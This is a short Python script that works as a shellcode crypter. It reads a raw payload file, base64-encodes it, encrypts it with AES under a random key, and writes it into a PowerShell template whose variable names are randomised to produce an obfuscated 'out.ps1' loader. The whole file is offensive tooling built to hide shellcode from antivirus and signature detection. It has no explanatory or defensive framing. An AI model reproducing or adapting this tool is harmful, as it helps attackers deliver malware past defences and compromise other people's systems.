import random
import string
import hashlib
from Crypto import Random
from Crypto.Cipher import AES
import base64
import sys

arch = 'x86' # do x64 for 64 bit
payload_file = "payload.bin" # Shellcode filename
outfile = "out.ps1" # Output file

def randomString(stringLength=random.choice(range(5, random.choice(range(10,25))))):
	letters = string.ascii_lowercase + string.ascii_uppercase + string.digits
	return str(random.choice(string.ascii_lowercase + string.ascii_uppercase) + ''.join(random.choice(letters) for i in range(stringLength))).strip()

class AESCipher(object):
    def __init__(self, key):
        self.bs = 16
        self.key = hashlib.sha256(AESCipher.str_to_bytes(key)).digest()

    @staticmethod
    def str_to_bytes(data):
        u_type = type(b''.decode('utf8'))
        if isinstance(data, u_type):
            return data.encode('utf8')
        return data

    def _pad(self, s):
        return s + (self.bs - len(s) % self.bs) * AESCipher.str_to_bytes(chr(self.bs - len(s) % self.bs))

    @staticmethod
    def _unpad(s):
        return s[:-ord(s[len(s)-1:])]

    def encrypt(self, raw):
        raw = self._pad(AESCipher.str_to_bytes(raw))
        iv = Random.new().read(AES.block_size)
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        return base64.b64encode(iv + cipher.encrypt(raw)).decode('utf-8')

def prepare_payload(payload):
	key = randomString(stringLength=31)
	cipher = AESCipher(key=key)
	return base64.b64encode(cipher.encrypt(payload)), key

file = open('payload_template_%s.ps1' % arch,'r').read()

i = 1
while i < 50:
	file = file.replace("%%%%VAR%d%%%%" % i, randomString())
	i = i + 1
payload = open(payload_file,'rb').read()
payload = base64.b64encode(payload)
payload = prepare_payload(payload)
file = file.replace("%%PAYLOAD%%", payload[0])
file = file.replace("%%CIPHER%%", payload[1])
open(outfile,'w').write(file)